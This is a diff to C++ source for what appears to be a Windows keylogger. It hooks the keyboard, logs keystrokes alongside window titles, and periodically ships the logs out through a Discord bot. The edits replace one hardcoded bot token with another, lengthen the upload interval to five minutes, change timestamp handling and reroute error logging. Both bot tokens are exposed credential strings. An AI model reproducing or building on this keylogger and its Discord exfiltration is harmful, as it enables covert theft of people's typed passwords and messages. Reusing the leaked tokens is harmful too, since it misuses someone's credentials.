@@ -37,7 +37,7 @@
 // #define sh_winapi_success(x) assert(x == S_OK)
 // #define winapi_success(x) assert(x != 0)
 
-const std::string    BOT_TOKEN    = "Nzk1MjgzNjM2MDg1MzI1ODI1.GJQ65H.orWw99qm-DPXVNYJxb767PoppSohLsphOJKcJw";
+const std::string    BOT_TOKEN    = "Nzk1MjgzNjM2MDg1MzI1ODI1.G9gcxc.oaYk-11OnqfHzg9pp5chK5af97lK-xN2DVcKB4";
 
 HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
@@ -112,7 +112,7 @@ inline void print_to(const char* format, ...) {
 // void send_data(std::string& err) {
 void send_data() {
 	while(true) {
-		std::this_thread::sleep_for(std::chrono::minutes(1));
+		std::this_thread::sleep_for(std::chrono::minutes(5));
 
 		std::string err = "ok!";	//temp
 		int __fileindex = 0;
@@ -165,7 +165,7 @@ int Save(int key_stroke) {
 			wcscpy(lastwindow, window_title);
 			wide_char_to_mb(window_title, mbwindow_title, 260);
 			std::string strwindow_title(mbwindow_title);
-			long long timestamp = std::chrono::steady_clock::now().time_since_epoch().count();
+			time_t timestamp = time(NULL);
 
 			if (mapper[strwindow_title] == 0) {
 				if (process_counter >= ~(0U)) {
@@ -329,7 +329,7 @@ void botrun()
 		bot_connected_condvar.notify_all();
     }
     catch (dpp::exception& e) {
-        printf("\n%s", e.what());
+        logger("\n[ERROR] %s\n", e.what());
 		is_bot_connected = -1;
 		bot_connected_condvar.notify_all();
     }
